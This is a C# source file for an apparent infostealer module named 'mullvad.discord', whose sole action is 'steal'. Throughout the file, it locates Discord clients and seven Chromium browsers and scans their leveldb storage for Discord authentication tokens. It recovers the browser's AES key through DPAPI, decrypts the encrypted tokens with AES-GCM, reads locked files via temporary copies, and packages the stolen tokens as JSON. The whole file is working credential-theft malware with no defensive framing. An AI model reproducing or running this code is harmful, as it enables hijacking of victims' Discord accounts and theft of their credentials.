using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace mullvad.Module.Discord
{
    public sealed class DiscordModule
    {
        public static string ModuleId => "mullvad.discord";

        public string Execute(string action, string payload)
        {
            try { return action == "steal" ? Steal() : Err("unknown action: " + action); }
            catch (Exception ex) { return Err(ex.Message); }
        }

        // ── Regexes (Intellix-derived) ─────────────────────────────────────────

        // Matches mfa tokens and MT/OD user tokens in plain text
        private static readonly Regex _tokenRx = new Regex(
            @"(mfa\.[\w-]{80,})|((MT|OD)[\w-]{22,24}\.[\w-]{6}\.[\w-]{25,110})",
            RegexOptions.IgnoreCase | RegexOptions.Compiled);

        // Matches Chromium-encrypted token blobs stored as JSON values
        private static readonly Regex _encRx = new Regex(
            "\"dQw4w9WgXcQ:([^\"]+)\"",
            RegexOptions.IgnoreCase | RegexOptions.Compiled);

        // ── Paths ──────────────────────────────────────────────────────────────

        private static readonly string[] _discordPaths = BuildDiscordPaths();
        private static readonly string[] _chromiumPaths = BuildChromiumPaths();

        private static string[] BuildDiscordPaths()
        {
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            return new[]
            {
                Path.Combine(appdata, "discord"),
                Path.Combine(appdata, "discordcanary"),
                Path.Combine(appdata, "discordptb"),
                Path.Combine(appdata, "discorddevelopment"),
            };
        }

        private static string[] BuildChromiumPaths()
        {
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var local   = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            return new[]
            {
                Path.Combine(local,   @"Google\Chrome\User Data"),
                Path.Combine(local,   @"BraveSoftware\Brave-Browser\User Data"),
                Path.Combine(local,   @"Microsoft\Edge\User Data"),
                Path.Combine(appdata, @"Opera Software\Opera Stable"),
                Path.Combine(local,   @"Yandex\YandexBrowser\User Data"),
                Path.Combine(local,   @"Vivaldi\User Data"),
                Path.Combine(local,   @"CocCoc\Browser\User Data"),
            };
        }

        // ── Extraction ─────────────────────────────────────────────────────────

        private static string Steal()
        {
            // token → source label, keyed by token string to deduplicate
            var seen = new System.Collections.Concurrent.ConcurrentDictionary<string, string>(StringComparer.Ordinal);
            int filesScanned = 0, gcmOk = 0, gcmFail = 0;
            string dpapiStatus = "not_tried";

            // Discord app paths
            var discordLabels = new Dictionary<string, string>
            {
                ["discord"]            = "Discord",
                ["discordcanary"]      = "Discord Canary",
                ["discordptb"]         = "Discord PTB",
                ["discorddevelopment"] = "Discord Dev",
            };

            Parallel.ForEach(_discordPaths, basePath =>
            {
                var leveldb = Path.Combine(basePath, "Local Storage", "leveldb");
                if (!Directory.Exists(leveldb)) return;

                string label = discordLabels.TryGetValue(Path.GetFileName(basePath).ToLowerInvariant(), out var l) ? l : "Discord";
                var localstate = Path.Combine(basePath, "Local State");
                var grabbed = GrabFromLeveldb(leveldb, localstate,
                    ref dpapiStatus, ref filesScanned, ref gcmOk, ref gcmFail);
                foreach (var t in grabbed) seen.TryAdd(t, label);
            });

            // Chromium browser paths (Discord web app)
            var browserLabels = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                [@"Google\Chrome\User Data"]             = "Chrome",
                [@"BraveSoftware\Brave-Browser\User Data"] = "Brave",
                [@"Microsoft\Edge\User Data"]            = "Edge",
                [@"Opera Software\Opera Stable"]         = "Opera",
                [@"Yandex\YandexBrowser\User Data"]      = "Yandex",
                [@"Vivaldi\User Data"]                   = "Vivaldi",
                [@"CocCoc\Browser\User Data"]            = "CocCoc",
            };

            Parallel.ForEach(_chromiumPaths, browserBase =>
            {
                if (!Directory.Exists(browserBase)) return;

                string browserLabel = "Browser";
                foreach (var kv in browserLabels)
                    if (browserBase.EndsWith(kv.Key, StringComparison.OrdinalIgnoreCase))
                        { browserLabel = kv.Value; break; }

                string[] profiles;
                try { profiles = Directory.GetDirectories(browserBase); }
                catch { return; }

                Parallel.ForEach(profiles, profile =>
                {
                    var leveldb = Path.Combine(profile, "Local Storage", "leveldb");
                    if (!Directory.Exists(leveldb)) return;

                    var localstate = Path.Combine(browserBase, "Local State");
                    var grabbed = GrabFromLeveldb(leveldb, localstate,
                        ref dpapiStatus, ref filesScanned, ref gcmOk, ref gcmFail);
                    foreach (var t in grabbed) seen.TryAdd(t, browserLabel);
                });
            });

            var sb = new StringBuilder("{\"tokens\":[");
            bool first = true;
            foreach (var kv in seen)
            {
                if (!first) sb.Append(',');
                sb.Append("{\"token\":").Append(Json(kv.Key))
                  .Append(",\"source\":").Append(Json(kv.Value)).Append('}');
                first = false;
            }
            sb.Append("],\"diag\":{");
            sb.Append("\"dpapi\":").Append(Json(dpapiStatus)).Append(',');
            sb.Append("\"files\":").Append(filesScanned).Append(',');
            sb.Append("\"gcm_ok\":").Append(gcmOk).Append(',');
            sb.Append("\"gcm_fail\":").Append(gcmFail);
            sb.Append("}}");
            return sb.ToString();
        }

        private static List<string> GrabFromLeveldb(
            string leveldb, string localstate,
            ref string dpapiStatus, ref int filesScanned, ref int gcmOk, ref int gcmFail)
        {
            var files = new List<string>();
            try { files.AddRange(Directory.GetFiles(leveldb, "*.ldb")); } catch { }
            try { files.AddRange(Directory.GetFiles(leveldb, "*.log")); } catch { }

            if (files.Count == 0) return new List<string>();

            byte[]? aesKey = null;
            string dpStatus = "not_tried";
            if (File.Exists(localstate))
                aesKey = GetLocalStateKey(localstate, out dpStatus);

            if (dpapiStatus == "not_tried") dpapiStatus = dpStatus;

            var plain     = new ConcurrentBag<string>();
            var encrypted = new ConcurrentBag<string>();

            // Local counters — ref params cannot cross lambda boundary
            int localFiles = 0, localGcmOk = 0, localGcmFail = 0;

            Parallel.ForEach(files, file =>
            {
                string content;
                try { content = Encoding.UTF8.GetString(TryReadFile(file) ?? Array.Empty<byte>()); }
                catch { return; }

                System.Threading.Interlocked.Increment(ref localFiles);

                // Plain-text tokens — group 1 = mfa, group 2 = MT/OD
                foreach (Match m in _tokenRx.Matches(content))
                {
                    string tok = m.Groups[1].Success ? m.Groups[1].Value : m.Groups[2].Value;
                    if (!string.IsNullOrWhiteSpace(tok)) plain.Add(tok);
                }

                // Encrypted blobs stored as dQw4w9WgXcQ:<base64>
                foreach (Match m in _encRx.Matches(content))
                {
                    var b64 = m.Groups[1].Value;
                    if (!string.IsNullOrWhiteSpace(b64)) encrypted.Add(b64);
                }
            });

            var result = new List<string>(plain.Distinct(StringComparer.OrdinalIgnoreCase));

            if (encrypted.Count > 0 && aesKey != null)
            {
                using var gcm = AesGcmKey.Create(aesKey);
                if (gcm != null)
                {
                    foreach (var b64 in encrypted.Distinct(StringComparer.Ordinal))
                    {
                        try
                        {
                            // decoded: [v10 prefix (3)] [nonce (12)] [ciphertext (?)] [tag (16)]
                            var raw = Convert.FromBase64String(b64);
                            if (raw.Length < 3 + 12 + 1 + 16)
                            {
                                localGcmFail++;
                                continue;
                            }

                            int ctLen = raw.Length - 3 - 12 - 16;
                            var nonce  = new byte[12];
                            var cipher = new byte[ctLen];
                            var tag    = new byte[16];
                            Array.Copy(raw, 3,               nonce,  0, 12);
                            Array.Copy(raw, 3 + 12,          cipher, 0, ctLen);
                            Array.Copy(raw, 3 + 12 + ctLen,  tag,    0, 16);

                            byte[]? plain2 = gcm.Decrypt(nonce, cipher, tag);
                            if (plain2 == null) { localGcmFail++; continue; }

                            localGcmOk++;
                            var dec = Encoding.UTF8.GetString(plain2).Trim();
                            if (!string.IsNullOrWhiteSpace(dec)) result.Add(dec);
                        }
                        catch { localGcmFail++; }
                    }
                }
            }

            // Merge local counters back into caller's refs
            System.Threading.Interlocked.Add(ref filesScanned, localFiles);
            System.Threading.Interlocked.Add(ref gcmOk,        localGcmOk);
            System.Threading.Interlocked.Add(ref gcmFail,      localGcmFail);

            return result.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
        }

        // ── File read with locked-file fallback ───────────────────────────────

        private static byte[]? TryReadFile(string path)
        {
            try { return File.ReadAllBytes(path); }
            catch { }
            try
            {
                string tmp = Path.Combine(Path.GetTempPath(), "dcrd_" + Guid.NewGuid().ToString("N") + ".tmp");
                File.Copy(path, tmp, overwrite: true);
                try { return File.ReadAllBytes(tmp); }
                finally { try { File.Delete(tmp); } catch { } }
            }
            catch { return null; }
        }

        // ── Local State AES key ────────────────────────────────────────────────

        private static byte[]? GetLocalStateKey(string localstatePath, out string status)
        {
            status = "no_local_state";
            try
            {
                var content = File.ReadAllText(localstatePath);
                var m = Regex.Match(content, "\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
                if (!m.Success) { status = "no_encrypted_key"; return null; }

                var enc = Convert.FromBase64String(m.Groups[1].Value);
                if (enc.Length <= 5) { status = "key_too_short"; return null; }

                // strip 5-byte "DPAPI" ASCII prefix
                var blob = new byte[enc.Length - 5];
                Array.Copy(enc, 5, blob, 0, blob.Length);

                var key = DpapiDecrypt(blob);
                if (key == null) { status = "dpapi_failed"; return null; }

                status = "dpapi_ok_" + key.Length + "b";
                return key;
            }
            catch (Exception ex) { status = "ex:" + ex.GetType().Name; return null; }
        }

        // ── AES-GCM via BCrypt (net472-compatible) ────────────────────────────

        private sealed class AesGcmKey : IDisposable
        {
            private IntPtr _hAlg = IntPtr.Zero;
            private IntPtr _hKey = IntPtr.Zero;
            private bool   _disposed;

            private AesGcmKey() { }

            public static AesGcmKey? Create(byte[] key)
            {
                var k = new AesGcmKey();
                if (BCryptOpenAlgorithmProvider(out k._hAlg, "AES", null, 0) != 0)
                    { k.Dispose(); return null; }

                var mode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
                if (BCryptSetProperty(k._hAlg, "ChainingMode", mode, mode.Length, 0) != 0)
                    { k.Dispose(); return null; }

                if (BCryptGenerateSymmetricKey(k._hAlg, out k._hKey, IntPtr.Zero, 0, key, key.Length, 0) != 0)
                    { k.Dispose(); return null; }

                return k;
            }

            public byte[]? Decrypt(byte[] nonce, byte[] cipher, byte[] tag)
            {
                if (_disposed || _hKey == IntPtr.Zero) return null;

                GCHandle noncePin = default, tagPin = default;
                try
                {
                    noncePin = GCHandle.Alloc(nonce, GCHandleType.Pinned);
                    tagPin   = GCHandle.Alloc(tag,   GCHandleType.Pinned);

                    var info = new BCRYPT_AUTH_INFO
                    {
                        cbSize        = (uint)Marshal.SizeOf(typeof(BCRYPT_AUTH_INFO)),
                        dwInfoVersion = 1,
                        pbNonce       = noncePin.AddrOfPinnedObject(),
                        cbNonce       = (uint)nonce.Length,
                        pbAuthData    = IntPtr.Zero,
                        cbAuthData    = 0,
                        pbTag         = tagPin.AddrOfPinnedObject(),
                        cbTag         = (uint)tag.Length,
                        pbMacContext  = IntPtr.Zero,
                        cbMacContext  = 0,
                        cbAAD         = 0,
                        cbData        = 0,
                        dwFlags       = 0,
                    };

                    var plain = new byte[cipher.Length];
                    int st = BCryptDecrypt(_hKey, cipher, cipher.Length, ref info,
                                          IntPtr.Zero, 0, plain, plain.Length, out int cbResult, 0);
                    if (st != 0) return null;

                    var result = new byte[cbResult];
                    Array.Copy(plain, result, cbResult);
                    return result;
                }
                finally
                {
                    if (noncePin.IsAllocated) noncePin.Free();
                    if (tagPin.IsAllocated)   tagPin.Free();
                }
            }

            public void Dispose()
            {
                if (_disposed) return;
                _disposed = true;
                if (_hKey != IntPtr.Zero) { BCryptDestroyKey(_hKey);                _hKey = IntPtr.Zero; }
                if (_hAlg != IntPtr.Zero) { BCryptCloseAlgorithmProvider(_hAlg, 0); _hAlg = IntPtr.Zero; }
            }
        }

        // ── BCrypt P/Invoke ────────────────────────────────────────────────────

        [StructLayout(LayoutKind.Sequential)]
        private struct BCRYPT_AUTH_INFO
        {
            public uint   cbSize;
            public uint   dwInfoVersion;
            public IntPtr pbNonce;
            public uint   cbNonce;
            public IntPtr pbAuthData;
            public uint   cbAuthData;
            public IntPtr pbTag;
            public uint   cbTag;
            public IntPtr pbMacContext;
            public uint   cbMacContext;
            public uint   cbAAD;
            public ulong  cbData;
            public uint   dwFlags;
        }

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlg, string algId, string? impl, uint flags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        private static extern int BCryptSetProperty(IntPtr hObj, string prop, byte[] input, int cbInput, uint flags);

        [DllImport("bcrypt.dll")]
        private static extern int BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr phKey, IntPtr keyObj, int cbKeyObj, byte[] secret, int cbSecret, uint flags);

        [DllImport("bcrypt.dll")]
        private static extern int BCryptDecrypt(IntPtr hKey, byte[] input, int cbInput, ref BCRYPT_AUTH_INFO pInfo, IntPtr iv, int cbIV, byte[] output, int cbOutput, out int pcbResult, uint flags);

        [DllImport("bcrypt.dll")]
        private static extern int BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll")]
        private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlg, uint flags);

        // ── DPAPI ──────────────────────────────────────────────────────────────

        [StructLayout(LayoutKind.Sequential)]
        private struct DATA_BLOB { public int cbData; public IntPtr pbData; }

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn, string? szDataDescr,
            IntPtr pOptionalEntropy, IntPtr pvReserved,
            IntPtr pPromptStruct, int dwFlags,
            ref DATA_BLOB pDataOut);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LocalFree(IntPtr hMem);

        private static byte[]? DpapiDecrypt(byte[] data)
        {
            var pin = GCHandle.Alloc(data, GCHandleType.Pinned);
            try
            {
                var inBlob  = new DATA_BLOB { cbData = data.Length, pbData = pin.AddrOfPinnedObject() };
                var outBlob = new DATA_BLOB();
                if (!CryptUnprotectData(ref inBlob, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref outBlob))
                    return null;
                var result = new byte[outBlob.cbData];
                Marshal.Copy(outBlob.pbData, result, 0, result.Length);
                LocalFree(outBlob.pbData);
                return result;
            }
            finally { pin.Free(); }
        }

        // ── Helpers ────────────────────────────────────────────────────────────

        private static string Err(string msg) => "{\"error\":" + Json(msg) + "}";

        private static string Json(string s)
            => "\"" + s.Replace("\\", "\\\\").Replace("\"", "\\\"")
                       .Replace("\r", "\\r").Replace("\n", "\\n") + "\"";
    }
}
